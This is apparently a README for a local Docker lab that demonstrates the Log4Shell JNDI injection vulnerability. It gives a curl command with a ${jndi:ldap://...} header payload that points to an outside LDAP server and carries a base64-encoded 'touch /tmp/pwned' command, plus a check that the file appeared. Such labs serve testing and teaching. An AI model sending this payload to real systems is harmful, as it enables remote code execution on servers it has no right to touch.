# Startup requirements

- curl 
- docker
  
---
# Startup command 

```
docker-compose up -d
```

# Exploit commands

Exploit call with the base 64 command appended to the ldap call ( this command will run `touch /tmp/pwned` on the victim server)

```
curl localhost:8088 -H 'X-Api-Version: ${jndi:ldap://host.docker.internal:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

Command to see the file being created by the ldap call

```
docker exec l4j ls /tmp
```